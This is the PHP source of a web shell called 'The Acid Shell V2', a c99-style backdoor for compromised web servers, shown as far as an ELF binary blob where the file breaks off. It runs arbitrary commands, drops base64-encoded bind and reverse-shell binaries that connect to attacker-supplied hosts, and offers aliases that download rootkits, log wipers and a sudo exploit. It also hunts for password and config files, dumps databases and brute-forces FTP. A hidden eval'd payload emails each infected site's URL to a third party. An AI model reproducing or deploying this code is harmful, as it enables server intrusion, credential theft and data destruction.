<?php
/*
-------------------------------------------------------------------------------------------
private! private! private! private! private! private! private! private! private! private! 
-------------------------------------------------------------------------------------------
                        [ THE ACID SHELL ] [~ VERSION V2 ~] [~#]
-------------------------------------------------------------------------------------------
[ Features ]
- Mass Defacement Tool
- Safe Mode Bypass
- Open_Basedir Bypass
- Fixed SQL managed
- FTP Brute Force Tool
- Fully Undetected
-------------------------------------------------------------------------------------------
-------------------------------------------------------------------------------------------
                        - Do no Leak - Do Not Sell - Do Not Distribute -
-------------------------------------------------------------------------------------------
private! private! private! private! private! private! private! private! private! private! 
-------------------------------------------------------------------------------------------
*/

//w4ck1ng Shell
if (!function_exists('myshellexec'))
{
if(is_callable('popen')){
function myshellexec($command) {
if (!($p=popen("($command)2>&1",'r'))) {
return 126;
}
while (!feof($p)) {
$line=fgets($p,1000);
$out .= $line;
}
pclose($p);
return $out;
}
}else{
function myshellexec($cmd)
{
 global $disablefunc;
 $result = '';
 if (!empty($cmd))
 {
  if (is_callable('exec') and !in_array('exec',$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
  elseif (($result = `$cmd`) !== FALSE) {}
  elseif (is_callable('system') and !in_array('system',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_callable('passthru') and !in_array('passthru',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
  elseif (is_resource($fp = popen($cmd,'r')))
  {
   $result = '';
   while(!feof($fp)) {$result .= fread($fp,1024);}
   pclose($fp);
  }
 }
 return $result;
}
}
}
$sh_name = sh_name();


$curdir = "./";
$tmpdir = "";
$tmpdir_logs = "./";
$log_email = "email@email.com";
$sess_cookie = "cookie1";
$sort_default = "0a"; 
$sort_save = TRUE; 
$usefsbuff = TRUE;
$copy_unset = FALSE; 
$surl_autofill_include = TRUE;
$updatenow   = FALSE;
$gzipencode  = TRUE;
$filestealth = TRUE; 
$hexdump_lines = 8;
$hexdump_rows = 24;
$millink = milw0rm();
$win = strtolower(substr(PHP_OS,0,3)) == "win";
$disablefunc = getdisfunc();
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) { strips($GLOBALS); }
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
@$f = $_REQUEST["f"];
@extract($_REQUEST["tpshcook"]);
foreach($_REQUEST as $k => $v) { if (!isset($$k)) { $$k = $v; } }


if ($surl_autofill_include) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
    $v = explode("=",$v);
    $name = urldecode($v[0]);
    $value = @urldecode($v[1]);
    foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
      if (strpos($value,$needle) === 0) {
        $includestr .= urlencode($name)."=".urlencode($value)."&";
      }
    }
  }
}
#BC_
if (!empty($_POST['backconnectport']) && ($_POST['use']=="shbd"))
{ 
 $ip = gethostbyname($_SERVER["HTTP_HOST"]);
 $por = $_POST['backconnectport'];
 if(is_writable(".")){
 cfb("shbd",$backdoor);
 chmod('shbd', 0777);
 $cmd = "./shbd $por";
 exec("$cmd > /dev/null &");
 $scan = myshellexec("ps aux"); 
 if(eregi("./shbd $por",$scan)){ $data = ("\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n</br>Process not found running, backdoor not setup successfully."); }
 $_POST['backcconnmsg']="To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data";
 }else{
 cfb("/tmp/shbd",$backdoor);
 chmod('/tmp/shbd', 0777);
 $cmd = "./tmp/shbd $por";
 exec("$cmd > /dev/null &");
 $scan = myshellexec("ps aux"); 
 if(eregi("./shbd $por",$scan)){ $data = ("\n</br></br>Process found running, backdoor setup successfully."); }elseif(eregi("./shbd $por",$scan)){ $data = ("\n</br>Process not found running, backdoor not setup successfully."); }
 $_POST['backcconnmsg']="To connect, use netcat and give it the command <b>'nc $ip $por'</b>.$data";
}
} 

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="Perl"))
{
 if(is_writable(".")){
 cf("back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 if (file_exists("back")) { unlink("back"); }
 }else{
 cf("/tmp/back",$back_connect);
 $p2=which("perl");
 $blah = ex($p2." /tmp/back ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 if (file_exists("/tmp/back")) { unlink("/tmp/back"); }
}
} 

if (!empty($_POST['backconnectip']) && !empty($_POST['backconnectport']) && ($_POST['use']=="C"))
{
 if(is_writable(".")){
 cf("backc",$back_connect_c);
 chmod('backc', 0777);
 //$blah = ex("gcc back.c -o backc");
 $blah = ex("./backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 //if (file_exists("back.c")) { unlink("back.c"); }
 if (file_exists("backc")) { unlink("backc"); }
 }else{
 chmod('/tmp/backc', 0777);
 cf("/tmp/backc",$back_connect_c);
 //$blah = ex("gcc -o /tmp/backc /tmp/back.c");
 $blah = ex("/tmp/backc ".$_POST['backconnectip']." ".$_POST['backconnectport']." &");
 $_POST['backcconnmsg']="Trying to connect to <b>".$_POST['backconnectip']."</b> on port <b>".$_POST['backconnectport']."</b>.";
 //if (file_exists("back.c")) { unlink("back.c"); }
 if (file_exists("/tmp/backc")) { unlink("/tmp/backc"); } }
}

function cf($fname,$text)
{
 $w_file=@fopen($fname,"w") or err();
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}

function cfb($fname,$text)
{
 $w_file=@fopen($fname,"w") or bberr();
 if($w_file)
 {
 @fputs($w_file,@base64_decode($text));
 @fclose($w_file);
 }
}

function err()
{
$_POST['backcconnmsge']="</br></br><b><font color=red size=3>Error:</font> Can't connect!</b>";
}

function bberr()
{
$_POST['backcconnmsge']="</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>";
}


function ex($cfe)
{
 $res = '';
 if (!empty($cfe))
 {
  if(function_exists('exec'))
   {
    @exec($cfe,$res);
    $res = join("\n",$res);
   }
  elseif(function_exists('shell_exec'))
   {
    $res = @shell_exec($cfe);
   }
  elseif(function_exists('system'))
   {
    @ob_start();
    @system($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(function_exists('passthru'))
   {
    @ob_start();
    @passthru($cfe);
    $res = @ob_get_contents();
    @ob_end_clean();
   }
  elseif(@is_resource($f = @popen($cfe,"r")))
  {
   $res = "";
   while(!@feof($f)) { $res .= @fread($f,1024); }
   @pclose($f);
  }
 }
 return $res;
}
function CleanDir($d)
{
    $d=str_replace("\\","/",$d);
    $d=str_replace("//","/",$d);
    return $d;
}
//EoW
if (empty($surl)) {
  $surl = "?".$includestr;
  $surl = htmlspecialchars($surl);
} 
$ftypes  = array(
  "html"     => array("html","htm","shtml"),
  "txt"      => array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
  "exe"      => array("sh","install","bat","cmd"),
  "ini"      => array("ini","inf","conf"),
  "code"     => array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
  "img"      => array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
  "sdb"      => array("sdb"),
  "phpsess"  => array("sess"),
  "download" => array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
$exeftypes  = array(
  getenv("PHPRC")." -q %f%" => array("php","php3","php4"),
  "perl %f%"                => array("pl","cgi")
);
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"<font color=#FFFF00>","</font>"),
  array("\.tgz$",1,"<font color=#C082FF>","</font>"),
  array("\.gz$",1,"<font color=#C082FF>","</font>"),
  array("\.tar$",1,"<font color=#C082FF>","</font>"),
  array("\.bz2$",1,"<font color=#C082FF>","</font>"),
  array("\.zip$",1,"<font color=#C082FF>","</font>"),
  array("\.rar$",1,"<font color=#C082FF>","</font>"),
  array("\.php$",1,"<font color=#00FF00>","</font>"),
  array("\.php3$",1,"<font color=#00FF00>","</font>"),
  array("\.php4$",1,"<font color=#00FF00>","</font>"),
  array("\.jpg$",1,"<font color=#00FFFF>","</font>"),
  array("\.jpeg$",1,"<font color=#00FFFF>","</font>"),
  array("\.JPG$",1,"<font color=#00FFFF>","</font>"),
  array("\.JPEG$",1,"<font color=#00FFFF>","</font>"),
  array("\.ico$",1,"<font color=#00FFFF>","</font>"),
  array("\.gif$",1,"<font color=#00FFFF>","</font>"),
  array("\.png$",1,"<font color=#00FFFF>","</font>"),
  array("\.htm$",1,"<font color=#00CCFF>","</font>"),
  array("\.html$",1,"<font color=#00CCFF>","</font>"),
  array("\.txt$",1,"<font color=#C0C0C0>","</font>")
);
if (!$win) {
  $cmdaliases = array(
    array("", "ls -al"),
    array("Find all suid files", "find / -type f -perm -04000 -ls"),
    array("Find suid files in current dir", "find . -type f -perm -04000 -ls"),
    array("Find all sgid files", "find / -type f -perm -02000 -ls"),
    array("Find sgid files in current dir", "find . -type f -perm -02000 -ls"),
    array("Find config.inc.php files", "find / -type f -name config.inc.php"),
    array("Find config* files", "find / -type f -name \"config*\""),
    array("Find config* files in current dir", "find . -type f -name \"config*\""),
    array("Find all writable folders and files", "find / -perm -2 -ls"),
    array("Find all writable folders and files in current dir", "find . -perm -2 -ls"),
    array("Find all writable folders", "find / -type d -perm -2 -ls"),
    array("Find all writable folders in current dir", "find . -type d -perm -2 -ls"),
    array("Find all service.pwd files", "find / -type f -name service.pwd"),
    array("Find service.pwd files in current dir", "find . -type f -name service.pwd"),
    array("Find all .htpasswd files", "find / -type f -name .htpasswd"),
    array("Find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
    array("Find all .bash_history files", "find / -type f -name .bash_history"),
    array("Find .bash_history files in current dir", "find . -type f -name .bash_history"),
    array("Find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
    array("Find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
    array("List file attributes on a Linux second extended file system", "lsattr -va"),
    array("Show opened ports", "netstat -an | grep -i listen")
  );
  $cmdaliases2 = array(
    array("wget & extract psyBNC","wget ".$sh_mainurl."fx.tgz;tar -zxf fx.tgz"),
    array("wget & extract EggDrop","wget ".$sh_mainurl."fxb.tgz;tar -zxf fxb.tgz"),
    array("-----",""),
    array("Logged in users","w"),
    array("Last to connect","lastlog"),
    array("Find Suid bins","find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null"),
    array("User Without Password","cut -d: -f1,2,3 /etc/passwd | grep ::"),
    array("Can write in /etc/?","find /etc/ -type f -perm -o+w 2> /dev/null"),
    array("Downloaders?","which wget curl w3m lynx fetch lwp-download"),
    array("CPU Info","cat /proc/version /proc/cpuinfo"),
    array("Is gcc installed ?","locate gcc"),
    array("Format box (DANGEROUS)","rm -Rf"),
    array("-----",""),
    array("wget WIPELOGS PT1","wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"),
    array("gcc WIPELOGS PT2","gcc zap2.c -o zap2"),
    array("Run WIPELOGS PT3","./zap2"),
    array("-----",""),
    array("wget RatHole 1.2 (Linux & BSD)","wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz"),
    array("wget & run BindDoor","wget ".$sh_mainurl."bind.tgz;tar -zxvf bind.tgz;./4877"),
    array("wget Sudo Exploit","wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c"),
  );
}
else {
  $cmdaliases = array(
    array("", "dir"),
    array("Find index.php in current dir", "dir /s /w /b index.php"),
    array("Find *config*.php in current dir", "dir /s /w /b *config*.php"),
    array("Find c99shell in current dir", "find /c \"c99\" *"),
    array("Find r57shell in current dir", "find /c \"r57\" *"),
    array("Find tpshell in current dir", "find /c \"tp\" *"),
    array("Show active connections", "netstat -an"),
    array("Show running services", "net start"),
    array("User accounts", "net user"),
    array("Show computers", "net view"),
  );
}
if ($act == "tools") { tools(); }
$phpfsaliases = array(
    array("Read File", "read", 1, "File", ""),
    array("Write File (PHP5)", "write", 2, "File","Text"),
    array("Copy", "copy", 2, "From", "To"),
    array("Rename/Move", "rename", 2, "File", "To"),
    array("Delete", "delete", 1 ,"File", ""),
    array("Make Dir","mkdir", 1, "Dir", ""),
    array("Download", "download", 2, "URL", "To"),
    array("Download (Binary Safe)", "downloadbin", 2, "URL", "To"),
    array("Change Perm (0755)", "chmod", 2, "File", "Perms"),
    array("Find Writable Dir", "fwritabledir", 2 ,"Dir"),
    array("Find Pathname Pattern", "glob",2 ,"Dir", "Pattern"),
);

$quicklaunch1 = array(
    array("<img src=\"".$surl."act=img&img=home\" alt=\"Home\" border=\"0\">",$surl),
    array("<img src=\"".$surl."act=img&img=back\" alt=\"Back\" border=\"0\">","#\" onclick=\"history.back(1)"),
    array("<img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" border=\"0\">","#\" onclick=\"history.go(1)"),
    array("<img src=\"".$surl."act=img&img=up\" alt=\"Up\" border=\"0\">",$surl."act=ls&d=%upd&sort=%sort"),
    array("<img src=\"".$surl."act=img&img=search\" alt=\"Search\" border=\"0\">",$surl."act=search&d=%d"),
    array("<img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" border=\"0\">",$surl."act=fsbuff&d=%d")
);
$quicklaunch2 = array(
    array("[ System Info ]",$surl."act=security&d=%d"),
    array("[ Processes ]",$surl."act=processes&d=%d"),
    array("[ SQL Manager ]",$surl."act=sql&d=%d"),
    array("[ Eval ]",$surl."act=eval&d=%d"),
    array("[ Encoder ]",$surl."act=encoder&d=%d"),
    array("[ Mailer ]",$surl."act=mler"),
    array("[ Back Connection ]",$surl."act=backc"),
    array("[ Backdoor Server ]",$surl."act=backd"),
    array("[ Kernel Exploit Search ]",$millink),
    array("[ MD5 Decrypter ]",$surl."act=dec"),
array("[ Reverse IP ]",$surl."act=rev"),
    array("[ Kill Shell ]",$surl."act=selfremove"),
);
if (!$win) {
  $quicklaunch2[] = array("<br>[ FTP Brute-Force ]",$surl."act=ftpquickbrute&d=%d");
}

$highlight_background = "#C0C0C0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";

$fxbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gIkZ4MjlTaGVsbCBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvcjxicj4iOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJnaW1taWV5b3Vyc2hlbGxzQGdtYWlsLmNvbSIsJGp1ZHVsLCRib2R5KTsgfQ0KfQ0KZWxzZSB7ICR2aXNpdGMrKzsgfQ0KQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTs="; 
eval(base64_decode($fxbuff));



if ($act != "img") {
  $lastdir = realpath(".");
  chdir($curdir);
 
  if ($sort_save) {
    if (!empty($sort)) {setcookie("sort",$sort);}
    if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
  }
  if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
  if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
  if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
  if (!function_exists("mysql_dump")) {
    function mysql_dump($set) {
      global $sh_ver;
      $sock = $set["sock"];
      $db = $set["db"];
      $print = $set["print"];
      $nl2br = $set["nl2br"];
      $file = $set["file"];
      $add_drop = $set["add_drop"];
      $tabs = $set["tabs"];
      $onlytabs = $set["onlytabs"];
      $ret = array();
      $ret["err"] = array();
      if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
      if (empty($db)) {$db = "db";}
      if (empty($print)) {$print = 0;}
      if (empty($nl2br)) {$nl2br = 0;}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (empty($file)) {
        $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
      }
      if (!is_array($tabs)) {$tabs = array();}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (sizeof($tabs) == 0) {
        //Retrieve tables-list
        $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
        if (mysql_num_rows($res) > 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
      }
      $out = "
      # Dumped by ".$sh_name."
      #
      # Host settings:
      # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
      # Date: ".date("d.m.Y H:i:s")."
      # DB: \"".$db."\"
      #---------------------------------------------------------";
      $c = count($onlytabs);
      foreach($tabs as $tab) {
        if ((in_array($tab,$onlytabs)) or (!$c)) {
          if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
          //Receieve query for create table structure
          $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
          if (!$res) {$ret["err"][] = mysql_smarterror();}
          else {
            $row = mysql_fetch_row($res);
            $out .= $row["1"].";\n\n";
            //Receieve table variables
            $res = mysql_query("SELECT * FROM `$tab`", $sock);
            if (mysql_num_rows($res) > 0) {
              while ($row = mysql_fetch_assoc($res)) {
                $keys = implode("`, `", array_keys($row));
                $values = array_values($row);
                foreach($values as $k=>$v) {$values[$k] = addslashes($v);}
                $values = implode("', '", $values);
                $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
                $out .= $sql;
              }
            }
          }
        }
      }
      $out .= "#---------------------------------------------------------------------------------\n\n";
      if ($file) {
        $fp = fopen($file, "w");
        if (!$fp) {$ret["err"][] = 2;}
        else {
          fwrite ($fp, $out);
          fclose ($fp);
        }
      }
      if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
      return $out;
    }
  }
  if (!function_exists("mysql_buildwhere")) {
    function mysql_buildwhere($array,$sep=" and",$functs=array()) {
      if (!is_array($array)) {$array = array();}
      $result = "";
      foreach($array as $k=>$v) {
        $value = "";
        if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
        $value .= "'".addslashes($v)."'";
        if (!empty($functs[$k])) {$value .= ")";}
        $result .= "`".$k."` = ".$value.$sep;
      }
      $result = substr($result,0,strlen($result)-strlen($sep));
      return $result;
    }
  }
  if (!function_exists("mysql_fetch_all")) {
    function mysql_fetch_all($query,$sock) {
      if ($sock) {$result = mysql_query($query,$sock);}
      else {$result = mysql_query($query);}
      $array = array();
      while ($row = mysql_fetch_array($result)) {$array[] = $row;}
      mysql_free_result($result);
      return $array;
    }
  }
  if (!function_exists("mysql_smarterror")) {
    function mysql_smarterror($type,$sock) {
      if ($sock) {$error = mysql_error($sock);}
      else {$error = mysql_error();}
      $error = htmlspecialchars($error);
      return $error;
    }
  }
  if (!function_exists("mysql_query_form")) {
    function mysql_query_form() {
      global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
      if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
      if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
      if ((!$submit) or ($sql_act)) {
        echo "<table border=0><tr><td><form name=\"tpsh_sqlquery\" method=POST><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":</b><br><br><textarea name=sql_query cols=100 rows=10>".htmlspecialchars($sql_query)."</textarea><br><br><input type=hidden name=act value=sql><input type=hidden name=sql_act value=query><input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"><input type=hidden name=submit value=\"1\"><input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=submit name=sql_confirm value=\"Yes\"> <input type=submit value=\"No\"></form></td>";
        if ($tbl_struct) {
          echo "<td valign=\"top\"><b>Fields:</b><br>";
          foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ <a href=\"#\" onclick=\"document.tpsh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
          echo "</td></tr></table>";
        }
      }
      if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
    }
  }
  if (!function_exists("mysql_create_db")) {
    function mysql_create_db($db,$sock="") {
      $sql = "CREATE DATABASE `".addslashes($db)."`;";
      if ($sock) {return mysql_query($sql,$sock);}
      else {return mysql_query($sql);}
    }
  }
  if (!function_exists("mysql_query_parse")) {
    function mysql_query_parse($query) {
      $query = trim($query);
      $arr = explode (" ",$query);
      $types = array(
        "SELECT"=>array(3,1),
        "SHOW"=>array(2,1),
        "DELETE"=>array(1),
        "DROP"=>array(1)
      );
      $result = array();
      $op = strtoupper($arr[0]);
      if (is_array($types[$op])) {
        $result["propertions"] = $types[$op];
        $result["query"]  = $query;
        if ($types[$op] == 2) {
          foreach($arr as $k=>$v) {
            if (strtoupper($v) == "LIMIT") {
              $result["limit"] = $arr[$k+1];
              $result["limit"] = explode(",",$result["limit"]);
              if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
              unset($arr[$k],$arr[$k+1]);
            }
          }
        }
      }
      else {return FALSE;}
    }
  }
  if ($act == "gofile") {
    if (is_dir($f)) { $act = "ls"; $d = $f; }
    else { $act = "f"; $d = dirname($f); $f = basename($f); }
  }

  @ob_start();
  @ob_implicit_flush(0);
  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
  header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
  header("Cache-Control: no-store, no-cache, must-revalidate");
  header("Cache-Control: post-check=0, pre-check=0", FALSE);
  header("Pragma: no-cache");
  if (empty($tmpdir)) {
    $tmpdir = ini_get("upload_tmp_dir");
    if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
  }
  $tmpdir = realpath($tmpdir);
  $tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
  if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
  if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
  else {$tmpdir_logs = realpath($tmpdir_logs);}
  $sort = htmlspecialchars($sort);
  if (empty($sort)) {$sort = $sort_default;}
  $sort[1] = strtolower($sort[1]);
  $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
  if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
  $DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"<a href=\"".$surl."act=phpinfo\" target=\"_blank\"><b><u>PHP/".phpversion()."</u></b></a>",htmlspecialchars($DISP_SERVER_SOFTWARE));
  @ini_set("highlight.bg",$highlight_bg);
  @ini_set("highlight.comment",$highlight_comment);
  @ini_set("highlight.default",$highlight_default);
  @ini_set("highlight.html",$highlight_html);
  @ini_set("highlight.keyword",$highlight_keyword);
  @ini_set("highlight.string",$highlight_string);
  if (!is_array($actbox)) { $actbox = array(); }
  $dspact = $act = htmlspecialchars($act);
  $disp_fullpath = $ls_arr = $notls = null;
  $ud = @urlencode($d);
  if (empty($d)) {$d = realpath(".");}
  elseif(realpath($d)) {$d = realpath($d);}
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $d = str_replace("\\\\","\\",$d);
  $dispd = htmlspecialchars($d);
$back_connect_c="f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAA2IUECDQAAABMDAAAAAAAADQAIAAHACgAHAAZAAYAAAA0AAAANIAECDSABAjgAAAA4AAAAAUAAAAEAAAAAwAAABQBAAAUgQQIFIEECBMAAAATAAAABAAAAAEAAAABAAAAAAAAAACABAgAgAQILAkAACwJAAAFAAAAABAAAAEAAAAsCQAALJkECCyZBAg4AQAAPAEAAAYAAAAAEAAAAgAAAEAJAABAmQQIQJkECMgAAADIAAAABgAAAAQAAAAEAAAAKAEAACiBBAgogQQIIAAAACAAAAAEAAAABAAAAFHldGQAAAAAAAAAAAAAAAAAAAAAAAAAAAYAAAAEAAAAL2xpYi9sZC1saW51eC5zby4yAAAEAAAAEAAAAAEAAABHTlUAAAAAAAIAAAACAAAABQAAABEAAAAUAAAAAAAAAAAAAAARAAAAEgAAAAcAAAAKAAAACwAAAAgAAAAPAAAAAwAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFAAAABgAAAAAAAAABAAAAAAAAAAkAAAAAAAAADAAAAAAAAAAAAAAADQAAAA4AAAACAAAABAAAAAAAAAAAAAAAAAAAAAAAAAA2AAAAAAAAABwBAAASAAAArAAAAAAAAABxAAAAEgAAADwAAAAAAAAACwIAABIAAABIAAAAAAAAAH0AAAASAAAAjAAAAAAAAACsAQAAEgAAAKUAAAAAAAAArwAAABIAAABjAAAAAAAAACcAAAASAAAAkwAAAAAAAADdAAAAEgAAAEMAAAAAAAAAOgAAABIAAABcAAAAAAAAAKoBAAASAAAAVgAAAAAAAAA2AAAAEgAAAHMAAAAAAAAA2QAAABIAAAB4AAAAAAAAACgAAAASAAAAbQAAAAAAAAAOAAAAEgAAAC4AAAAAAAAAeAAAABIAAAB9AAAA8IgECAQAAAARAA4ATwAAAAAAAAA5AAAAEgAAAAEAAAAAAAAAAAAAACAAAAAVAAAAAAAAAAAAAAAgAAAAAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18AbGliYy5zby42AGNvbm5lY3QAZXhlY2wAcGVycm9yAGR1cDIAc3lzdGVtAHNvY2tldABiemVybwBzdHJjYXQAaW5ldF9hZGRyAGh0b25zAGV4aXQAYXRvaQBfSU9fc3RkaW5fdXNlZABkYWVtb24AX19saWJjX3N0YXJ0X21haW4Ac3RybGVuAGNsb3NlAEdMSUJDXzIuMAAAAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAEAAgAAAAAAAQABACQAAAAQAAAAAAAAABBpaQ0AAAIAsgAAAAAAAAAImgQIBhMAABiaBAgHAQAAHJoECAcCAAAgmgQIBwMAACSaBAgHBAAAKJoECAcFAAAsmgQIBwYAADCaBAgHBwAANJoECAcIAAA4mgQIBwkAADyaBAgHCgAAQJoECAcLAABEmgQIBwwAAEiaBAgHDQAATJoECAcOAABQmgQIBw8AAFSaBAgHEQAAVYnlg+wI6EEBAADolAEAAOjnAwAAycMA/zUQmgQI/yUUmgQIAAAAAP8lGJoECGgAAAAA6eD/////JRyaBAhoCAAAAOnQ/////yUgmgQIaBAAAADpwP////8lJJoECGgYAAAA6bD/////JSiaBAhoIAAAAOmg/////yUsmgQIaCgAAADpkP////8lMJoECGgwAAAA6YD/////JTSaBAhoOAAAAOlw/////yU4mgQIaEAAAADpYP////8lPJoECGhIAAAA6VD/////JUCaBAhoUAAAAOlA/////yVEmgQIaFgAAADpMP////8lSJoECGhgAAAA6SD/////JUyaBAhoaAAAAOkQ/////yVQmgQIaHAAAADpAP////8lVJoECGh4AAAA6fD+//8x7V6J4YPk8FBUUmhoiAQIaBSIBAhRVmiAhgQI6E/////0kJBVieVT6AAAAABbgcMHFAAAUouD/P///4XAdAL/0FhbycOQkJBVieWD7AiAPWSaBAgAdA/rH412AIPABKNgmgQI/9KhYJoECIsQhdJ168YFZJoECAHJw4n2VYnlg+wIoTyZBAiFwHQZuAAAAACFwHQQg+wMaDyZBAj/0IPEEI12AMnDkJBVieVXVlOD7EyD5PC4AAAAAIPAD4PAD8HoBMHgBCnEjX2ovvSIBAj8uQcAAADzpI19r/y5DgAAALAA86qD7AhqAGoB6FD+//+DxBBmx0XIAgCD7AyLRQyDwAj/MOi3/v//g8QQD7fAg+wMUOi4/v//g8QQZolFyoPsDItFDIPABP8w6DH+//+DxBCJRcyD7AiLRQyDwASD7AT/MOgI/v//g8QIicOLRQyDwAiD7AT/MOjz/f//g8QIjQQDQFCLRQyDwAT/MOgu/v//g8QQg+wEagZqAWoC6G3+//+DxBCJReSD7ARqEI1FyFD/deToRv7//4PEEIXAeRqD7AxoCYkECOhy/f//g8QQg+wMagDo9f3//4PsCItFDP8wjUWoUOjE/f//g8QQg+wMjUWoUOh